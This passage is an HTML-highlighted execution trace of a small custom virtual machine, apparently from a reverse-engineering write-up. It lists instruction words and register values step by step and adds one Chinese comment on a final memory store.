class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">28</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x400201</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">36</span> b:<span class="hljs-number">73</span> c:<span class="hljs-number">1</span>e d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">29</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x404037</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">37</span> b:<span class="hljs-number">73</span> c:<span class="hljs-number">1</span>e d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">2</span>a f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x1040e6</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">37</span> b:<span class="hljs-number">73</span> c:e6 d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">2</span>b f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x10140</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">37</span> b:<span class="hljs-number">62</span> c:e6 d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">2</span>c f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x11010</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">37</span> b:<span class="hljs-number">48</span> c:e6 d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">2</span>d f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x400201</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">37</span> b:<span class="hljs-number">48</span> c:e6 d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">2</span>e f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x404038</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">38</span> b:<span class="hljs-number">48</span> c:e6 d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">2</span>f f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x104088</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">38</span> b:<span class="hljs-number">48</span> c:<span class="hljs-number">88</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">30</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x10140</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">38</span> b:<span class="hljs-number">88</span> c:<span class="hljs-number">88</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">31</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x11010</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">38</span> b:<span class="hljs-number">10</span> c:<span class="hljs-number">88</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">32</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x400201</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">38</span> b:<span class="hljs-number">10</span> c:<span class="hljs-number">88</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">33</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x404039</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">39</span> b:<span class="hljs-number">10</span> c:<span class="hljs-number">88</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">34</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x104012</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">39</span> b:<span class="hljs-number">10</span> c:<span class="hljs-number">12</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">35</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x10140</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">39</span> b:<span class="hljs-number">12</span> c:<span class="hljs-number">12</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">36</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x11010</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">39</span> b:<span class="hljs-number">24</span> c:<span class="hljs-number">12</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">37</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x400201</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">39</span> b:<span class="hljs-number">24</span> c:<span class="hljs-number">12</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">38</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x40403a</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">3</span>a b:<span class="hljs-number">24</span> c:<span class="hljs-number">12</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">39</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x1040a1</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">3</span>a b:<span class="hljs-number">24</span> c:a1 d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">3</span>a f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x10140</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">3</span>a b:<span class="hljs-number">97</span> c:a1 d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">3</span>b f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x11010</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">3</span>a b:<span class="hljs-number">38</span> c:a1 d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">3</span>c f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x400201</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">3</span>a b:<span class="hljs-number">38</span> c:a1 d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">3</span>d f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x40403b</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">3</span>b b:<span class="hljs-number">38</span> c:a1 d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">3</span>e f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x1040d3</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">3</span>b b:<span class="hljs-number">38</span> c:d3 d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">3</span>f f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x10140</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">3</span>b b:<span class="hljs-number">15</span> c:d3 d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">40</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x11010</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">3</span>b b:e8 c:d3 d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">41</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x400201</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">3</span>b b:e8 c:d3 d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">42</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x40403c</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">3</span>c b:e8 c:d3 d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">43</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x1040c3</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">3</span>c b:e8 c:c3 d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">44</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x10140</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">3</span>c b:<span class="hljs-number">48</span> c:c3 d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">45</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x11010</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">3</span>c b:b c:c3 d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">46</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x400201</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">3</span>c b:b c:c3 d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">47</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x40403d</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">3</span>d b:b c:c3 d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">48</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x104002</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">3</span>d b:b c:<span class="hljs-number">2</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">49</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x10140</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">3</span>d b:a3 c:<span class="hljs-number">2</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">4</span>a f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x11010</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">3</span>d b:a5 c:<span class="hljs-number">2</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">4</span>b f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x400201</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">3</span>d b:a5 c:<span class="hljs-number">2</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">4</span>c f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x40403e</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">3</span>e b:a5 c:<span class="hljs-number">2</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">4</span>d f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x1040b2</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">3</span>e b:a5 c:b2 d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">4</span>e f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x10140</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">3</span>e b:<span class="hljs-number">48</span> c:b2 d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">4</span>f f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x11010</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">3</span>e b:fa c:b2 d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">50</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x400201</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">3</span>e b:fa c:b2 d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">51</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x40403f</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">3</span>f b:fa c:b2 d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">52</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x1040df</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">3</span>f b:fa c:df d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">53</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x10140</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">3</span>f b:<span class="hljs-number">91</span> c:df d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">54</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x11010</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">3</span>f b:<span class="hljs-number">70</span> c:df d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">55</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x400201</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">3</span>f b:<span class="hljs-number">70</span> c:df d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">56</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x404040</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">40</span> b:<span class="hljs-number">70</span> c:df d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">57</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x104095</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">40</span> b:<span class="hljs-number">70</span> c:<span class="hljs-number">95</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">58</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x10140</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">40</span> b:d c:<span class="hljs-number">95</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">59</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x11010</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">40</span> b:a2 c:<span class="hljs-number">95</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">5</span>a f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x400201</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">40</span> b:a2 c:<span class="hljs-number">95</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">5</span>b f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x404041</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">41</span> b:a2 c:<span class="hljs-number">95</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">5</span>c f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x1040f6</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">41</span> b:a2 c:f6 d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">5</span>d f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x10140</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">41</span> b:<span class="hljs-number">3</span>b c:f6 d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">5</span>e f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x11010</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">41</span> b:<span class="hljs-number">31</span> c:f6 d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">5</span>f f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x400201</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">41</span> b:<span class="hljs-number">31</span> c:f6 d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">60</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x404042</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">42</span> b:<span class="hljs-number">31</span> c:f6 d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">61</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x104098</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">42</span> b:<span class="hljs-number">31</span> c:<span class="hljs-number">98</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">62</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x10140</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">42</span> b:af c:<span class="hljs-number">98</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">63</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x11010</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">42</span> b:<span class="hljs-number">47</span> c:<span class="hljs-number">98</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">64</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x400201</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">42</span> b:<span class="hljs-number">47</span> c:<span class="hljs-number">98</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">65</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x404043</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">43</span> b:<span class="hljs-number">47</span> c:<span class="hljs-number">98</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">66</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x104057</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">43</span> b:<span class="hljs-number">47</span> c:<span class="hljs-number">57</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">67</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x10140</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">43</span> b:d3 c:<span class="hljs-number">57</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">68</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x11010</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">43</span> b:<span class="hljs-number">2</span>a c:<span class="hljs-number">57</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">69</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x400201</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">43</span> b:<span class="hljs-number">2</span>a c:<span class="hljs-number">57</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">6</span>a f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x404044</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">44</span> b:<span class="hljs-number">2</span>a c:<span class="hljs-number">57</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">6</span>b f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x104066</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">44</span> b:<span class="hljs-number">2</span>a c:<span class="hljs-number">66</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">6</span>c f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x10140</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">44</span> b:d2 c:<span class="hljs-number">66</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">6</span>d f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x11010</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">44</span> b:<span class="hljs-number">38</span> c:<span class="hljs-number">66</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">6</span>e f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x400201</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">44</span> b:<span class="hljs-number">38</span> c:<span class="hljs-number">66</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">6</span>f f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x404045</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">45</span> b:<span class="hljs-number">38</span> c:<span class="hljs-number">66</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">70</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x10400c</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">45</span> b:<span class="hljs-number">38</span> c:c d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">71</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x10140</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">45</span> b:<span class="hljs-number">0</span> c:c d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">72</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x11010</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">45</span> b:c c:c d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">73</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x400201</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">45</span> b:c c:c d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">74</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x404046</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">46</span> b:c c:c d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">75</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x104077</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">46</span> b:c c:<span class="hljs-number">77</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">76</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x10140</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">46</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">77</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">77</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x11010</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">46</span> b:<span class="hljs-number">77</span> c:<span class="hljs-number">77</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">78</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x400201</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">46</span> b:<span class="hljs-number">77</span> c:<span class="hljs-number">77</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">79</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x404047</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">47</span> b:<span class="hljs-number">77</span> c:<span class="hljs-number">77</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">7</span>a f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x1040e5</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">47</span> b:<span class="hljs-number">77</span> c:e5 d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">7</span>b f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x10140</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">47</span> b:<span class="hljs-number">0</span> c:e5 d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">7</span>c f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x11010</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">47</span> b:e5 c:e5 d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">7</span>d f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x400201</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">47</span> b:e5 c:e5 d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">7</span>e f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x404048</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">48</span> b:e5 c:e5 d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">7</span>f f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x10406d</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">48</span> b:e5 c:<span class="hljs-number">6</span>d d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">80</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x10140</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">48</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">6</span>d d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">81</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x11010</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">48</span> b:<span class="hljs-number">6</span>d c:<span class="hljs-number">6</span>d d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">82</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x400201</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">48</span> b:<span class="hljs-number">6</span>d c:<span class="hljs-number">6</span>d d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">83</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x404049</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">49</span> b:<span class="hljs-number">6</span>d c:<span class="hljs-number">6</span>d d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">84</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x104042</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">49</span> b:<span class="hljs-number">6</span>d c:<span class="hljs-number">42</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">85</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x10140</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">49</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">42</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">86</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x11010</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">49</span> b:<span class="hljs-number">42</span> c:<span class="hljs-number">42</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">87</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x400201</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">49</span> b:<span class="hljs-number">42</span> c:<span class="hljs-number">42</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">88</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x40404a</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">4</span>a b:<span class="hljs-number">42</span> c:<span class="hljs-number">42</span> d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">89</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x1040bf</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">4</span>a b:<span class="hljs-number">42</span> c:bf d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">8</span>a f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x10140</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">4</span>a b:<span class="hljs-number">0</span> c:bf d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">8</span>b f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x11010</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">4</span>a b:bf c:bf d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">8</span>c f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x400201</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">4</span>a b:bf c:bf d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">8</span>d f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x40404b</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">4</span>b b:bf c:bf d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">8</span>e f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x10401c</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">4</span>b b:bf c:<span class="hljs-number">1</span>c d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">8</span>f f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x10140</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">4</span>b b:<span class="hljs-number">0</span> c:<span class="hljs-number">1</span>c d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">90</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x11010</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">4</span>b b:<span class="hljs-number">1</span>c c:<span class="hljs-number">1</span>c d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">91</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x400201</span>						# 最后一个， STM *a = b, a1[<span class="hljs-number">0</span>x4b] = user28 + <span class="hljs-number">1</span>c<br><span class="hljs-attribute">a</span>:<span class="hljs-number">4</span>b b:<span class="hljs-number">1</span>c c:<span class="hljs-number">1</span>c d:<span class="hljs-number">15</span> s:<span class="hljs-number">3</span> i:<span class="hljs-number">92</span> f:<span class="hljs-number">0</span><br><span class="hljs-attribute">0x100800</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">4</span>b b:<span class="hljs-number">1</span>c 